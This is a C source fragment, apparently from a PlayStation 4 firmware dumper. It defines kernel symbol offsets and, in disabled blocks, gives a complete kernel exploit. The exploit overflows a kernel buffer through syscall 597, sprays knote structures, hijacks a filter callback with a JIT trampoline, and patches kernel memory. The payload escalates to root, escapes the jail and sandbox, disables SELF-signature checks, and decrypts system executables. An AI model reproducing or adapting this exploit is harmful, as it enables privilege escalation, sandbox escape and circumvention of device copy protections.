/* functions */
KFUNC(0x0023E3D0, _sx_xlock, int, (void *sx, int opts, const char *file, int line));
KFUNC(0x0023E500, _sx_xunlock, void, (void *sx, const char *file, int line));
KFUNC(0x00222660, kmalloc, void *, (uint64_t size, void *area, uint64_t flags));
KFUNC(0x00222820, kfree, void, (void *ptr, void *area));
KFUNC(0x0027B160, sys_write, void, (void *td, void *uap));
KFUNC(0x005AE860, sceSblDriverMapPages, int, (uint64_t *gpu_paddr, void *cpu_vaddr, uint32_t npages, uint64_t flags, uint64_t unk, uint64_t *gpu_desc));
KFUNC(0x005AEF90, sceSblDriverUnmapPages, int, (uint64_t gpu_desc));
KFUNC(0x00612940, map_chunk_table, int, (uint64_t *gpu_paddr, uint64_t *gpu_desc, void *cpu_vaddr));
KFUNC(0x005BF190, sceSblServiceMailbox, int, (uint64_t module_id, void *query, void *reply));
KFUNC(0x005C71E0, _sceSblAuthMgrSmFinalize, int, (void *ctx));

/* globals */
KDATA(0x01037250, prison0, void*);
KDATA(0x010A6920, M_AUTHMGR, void);
KDATA(0x010EF920, rootvnode, void*);
KDATA(0x025642F0, sceSblAuthMgrModuleId, uint64_t);
KDATA(0x01438010, authmgr_sm_xlock, void);
KDATA(0x013EC1E0, self_ctx_status, uint32_t);
KDATA(0x013EC060, self_contexts, self_context_t);

// TODO: Apply the patches below
#if 0
////// defines.h //////

#define	SLIST_ENTRY(type)						\
struct {								\
	struct type *sle_next;	/* next element */			\
}

#define	SLIST_HEAD(name, type)						\
struct name {								\
	struct type *slh_first;	/* first element */			\
}

#define	TRACEBUF

#define	TAILQ_ENTRY(type)						\
struct {								\
	struct type *tqe_next;	/* next element */			\
	struct type **tqe_prev;	/* address of previous next element */	\
	TRACEBUF							\
}

struct knote;

struct kevent {
	uintptr_t	ident;		/* identifier for this event */
	short		filter;		/* filter for event */
	unsigned short		flags;
	unsigned int		fflags;
	intptr_t	data;
	void		*udata;		/* opaque user data identifier */
};

struct filterops {
	int	f_isfd;		/* true if ident == filedescriptor */
	int	(*f_attach)(struct knote *kn);
	void	(*f_detach)(struct knote *kn);
	int	(*f_event)(struct knote *kn, long hint);
	void	(*f_touch)(struct knote *kn, struct kevent *kev, unsigned long type);
};

struct knote {
	SLIST_ENTRY(knote)	kn_link;	/* for kq */
	SLIST_ENTRY(knote)	kn_selnext;	/* for struct selinfo */
	struct			knlist *kn_knlist;	/* f_attach populated */
	TAILQ_ENTRY(knote)	kn_tqe;
	struct			kqueue *kn_kq;	/* which queue we are on */
	struct 			kevent kn_kevent;
	int			kn_status;	/* protected by kq lock */
	int			kn_sfflags;	/* saved filter flags */
	intptr_t		kn_sdata;	/* saved data field */
	union {
		struct		file *p_fp;	/* file data pointer */
		struct		proc *p_proc;	/* proc pointer */
		struct		aiocblist *p_aio;	/* AIO job pointer */
		struct		aioliojob *p_lio;	/* LIO job pointer */ 
	} kn_ptr;
	struct			filterops *kn_fop;
	void			*kn_hook;
	int			kn_hookid;
};
#endif

#if 0
////// main.c //////
// dlclose payload funtions

void payload(struct knote *kn) {
	struct thread *td;
	struct ucred *cred;

	// Get td pointer
	asm volatile("mov %0, %%gs:0" : "=r"(td));

	// Enable UART output
	uint16_t *securityflags = (uint16_t*)0xFFFFFFFF833242F6;
	*securityflags = *securityflags & ~(1 << 15); // bootparam_disable_console_output = 0

	// Print test message to the UART line
	//printfkernel("\n\n\n\n\n\n\n\n\nHello from kernel :-)\n\n\n\n\n\n\n\n\n");

	// Disable write protection
	cpu_disable_wp();
	
	// sysctl_machdep_rcmgr_debug_menu and sysctl_machdep_rcmgr_store_moe
	*(uint16_t *)0xFFFFFFFF82607C46 = 0x9090;
	*(uint16_t *)0xFFFFFFFF82607826 = 0x9090;
	
	*(char *)0xFFFFFFFF8332431A = 1;
	*(char *)0xFFFFFFFF83324338 = 1;


	// Allow self decryption		
	// sceSblAuthMgrIsLoadable		
	*(uint8_t *)(0xFFFFFFFF827C67A0) = 0x31;
	*(uint8_t *)(0xFFFFFFFF827C67A1) = 0xC0;
	*(uint8_t *)(0xFFFFFFFF827C67A2) = 0xC3;
	// allow mapping selfs - place 2
	*(uint8_t *)(0xFFFFFFFF825F5200) = 0xB8;
	*(uint8_t *)(0xFFFFFFFF825F5201) = 0x01;
	*(uint8_t *)(0xFFFFFFFF825F5202) = 0x00;
	*(uint8_t *)(0xFFFFFFFF825F5203) = 0x00;
	*(uint8_t *)(0xFFFFFFFF825F5204) = 0x00;
	*(uint8_t *)(0xFFFFFFFF825F5205) = 0xC3;
	// allow mapping selfs - place 3
	*(uint8_t *)(0xFFFFFFFF825F5210) = 0xB8;
	*(uint8_t *)(0xFFFFFFFF825F5211) = 0x01;
	*(uint8_t *)(0xFFFFFFFF825F5212) = 0x00;
	*(uint8_t *)(0xFFFFFFFF825F5213) = 0x00;
	*(uint8_t *)(0xFFFFFFFF825F5214) = 0x00;
	*(uint8_t *)(0xFFFFFFFF825F5215) = 0xC3;

	
	// Restore write protection
	cpu_enable_wp();
	
	// Resolve creds
	cred = td->td_proc->p_ucred;

	// Escalate process to root
	cred->cr_uid = 0;
	cred->cr_ruid = 0;
	cred->cr_rgid = 0;
	cred->cr_groups[0] = 0;

	void *td_ucred = *(void **)(((char *)td) + 304); // p_ucred == td_ucred
	
	// sceSblACMgrIsSystemUcred
	uint64_t *sonyCred = (uint64_t *)(((char *)td_ucred) + 96);
	*sonyCred = 0xffffffffffffffff;
	
	// sceSblACMgrGetDeviceAccessType
	uint64_t *sceProcType = (uint64_t *)(((char *)td_ucred) + 88);
	*sceProcType = 0x3801000000000013; // Max access
	
	// sceSblACMgrHasSceProcessCapability
	uint64_t *sceProcCap = (uint64_t *)(((char *)td_ucred) + 104);
	*sceProcCap = 0xffffffffffffffff; // Sce Process
	
	((uint64_t *)0xFFFFFFFF832CC2E8)[0] = 0x123456; //priv_check_cred bypass with suser_enabled=true
	((uint64_t *)0xFFFFFFFF8323DA18)[0] = 0; // bypass priv_check

	// Jailbreak ;)
	cred->cr_prison = (void *)0xFFFFFFFF83237250; //&prison0

	// Break out of the sandbox
	void *td_fdp = *(void **)(((char *)td->td_proc) + 72);
	uint64_t *td_fdp_fd_rdir = (uint64_t *)(((char *)td_fdp) + 24);
	uint64_t *td_fdp_fd_jdir = (uint64_t *)(((char *)td_fdp) + 32);
	uint64_t *rootvnode = (uint64_t *)0xFFFFFFFF832EF920;
	*td_fdp_fd_rdir = *rootvnode;
	*td_fdp_fd_jdir = *rootvnode;

	init_ksdk();
}

// Perform kernel allocation aligned to 0x800 bytes
int kernelAllocation(size_t size, int fd) {
	SceKernelEqueue queue = 0;
	sceKernelCreateEqueue(&queue, "kexec");

	sceKernelAddReadEvent(queue, fd, 0, NULL);

	return queue;
}

void kernelFree(int allocation) {
	close(allocation);
}

void *exploitThread(void *none) {
	dprintf("[+] Entered exploitThread\n");

	uint64_t bufferSize = 0x8000;
	uint64_t overflowSize = 0x8000;
	uint64_t copySize = bufferSize + overflowSize;
	
	// Round up to nearest multiple of PAGE_SIZE
	uint64_t mappingSize = (copySize + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
	
	uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	munmap(mapping + mappingSize, PAGE_SIZE);
	
	uint8_t *buffer = mapping + mappingSize - copySize;
	
	int64_t count = (0x100000000 + bufferSize) / 4;

	// Create structures
	struct knote kn;
	struct filterops fo;
	struct knote **overflow = (struct knote **)(buffer + bufferSize);
	overflow[2] = &kn;
	kn.kn_fop = &fo;

	// Setup trampoline to gracefully return to the calling thread
	void *trampw = NULL;
	void *trampe = NULL;
	int executableHandle;
	int writableHandle;
	uint8_t trampolinecode[] = {
		0x58, // pop rax
		0x48, 0xB8, 0x19, 0x39, 0x40, 0x82, 0xFF, 0xFF, 0xFF, 0xFF, // movabs rax, 0xffffffff82403919
		0x50, // push rax
		0x48, 0xB8, 0xBE, 0xBA, 0xAD, 0xDE, 0xDE, 0xC0, 0xAD, 0xDE, // movabs rax, 0xdeadc0dedeadbabe
		0xFF, 0xE0 // jmp rax
	};

	// Get Jit memory
	sceKernelJitCreateSharedMemory(0, PAGE_SIZE, PROT_CPU_READ | PROT_CPU_WRITE | PROT_CPU_EXEC, &executableHandle);
	sceKernelJitCreateAliasOfSharedMemory(executableHandle, PROT_CPU_READ | PROT_CPU_WRITE, &writableHandle);

	// Map r+w & r+e
	trampe = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_EXEC, MAP_SHARED, executableHandle, 0);
	trampw = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_TYPE, writableHandle, 0);

	// Copy trampoline to allocated address
	memcpy(trampw, trampolinecode, sizeof(trampolinecode));	
	*(void **)(trampw + 14) = (void *)payload;

	// Call trampoline when overflown
	fo.f_detach = trampe;

	// Start the exploit
	int sockets[0x2000];
	int allocation[50], m = 0, m2 = 0;
	int fd = (bufferSize - 0x800) / 8;

	dprintf("[+] Creating %d sockets\n", fd);

	// Create sockets
	for(int i = 0; i < 0x2000; i++) {
		sockets[i] = sceNetSocket("sss", AF_INET, SOCK_STREAM, 0);
		if(sockets[i] >= fd) {
			sockets[i + 1] = -1;
			break;
		}
	}

	// Spray the heap
	for(int i = 0; i < 50; i++) {
		allocation[i] = kernelAllocation(bufferSize, fd);
		dprintf("[+] allocation = %llp\n", allocation[i]);
	}

	// Create hole for the system call's allocation
	m = kernelAllocation(bufferSize, fd);
	m2 = kernelAllocation(bufferSize, fd);
	kernelFree(m);

	// Perform the overflow
	int result = syscall(597, 1, mapping, &count);
	dprintf("[+] Result: %d\n", result);

	// Execute the payload
	dprintf("[+] Freeing m2\n");
	kernelFree(m2);
	
	// Close sockets
	for(int i = 0; i < 0x2000; i++) {
		if(sockets[i] == -1)
			break;
		sceNetSocketClose(sockets[i]);
	}
	
	// Free allocations
	for(int i = 0; i < 50; i++) {
		kernelFree(allocation[i]);
	}
	
	// Free the mapping
	munmap(mapping, mappingSize);
	
	return NULL;
}

int _main()
{
    ScePthread thread;    


    /* Prepare userland environment */
   	initKernel();	
	initLibc();
	initNetwork();
	initJIT();
	initPthread();

    debug_init();
    blob_transfer_init();
    dprintf("Starting dump...\n");

    // Create exploit thread
	if(scePthreadCreate(&thread, NULL, exploitThread, NULL, "exploitThread") != 0) {
		dprintf("[-] pthread_create error\n");
		return 0;
	}

	// Wait for thread to exit
	scePthreadJoin(thread, NULL);

	// At this point we should have root and jailbreak
	if(getuid() != 0) {
		dprintf("[-] Kernel patch failed!\n");
		return 1;
	}

    /* Prepare kernel environment*/
    //syscall(11, init_ksdk);
    //syscall(11, kpatch_getroot);
    //syscall(11, kpatch_enablemapself);
	
    /* Dump data */
    traverse_dir("/", true, decrypt_self_to_elf);

    /* Return back to browser */
    dprintf("Dump finished!\n");
    blob_transfer_close();
    debug_close();
    return 0;
}
#endif
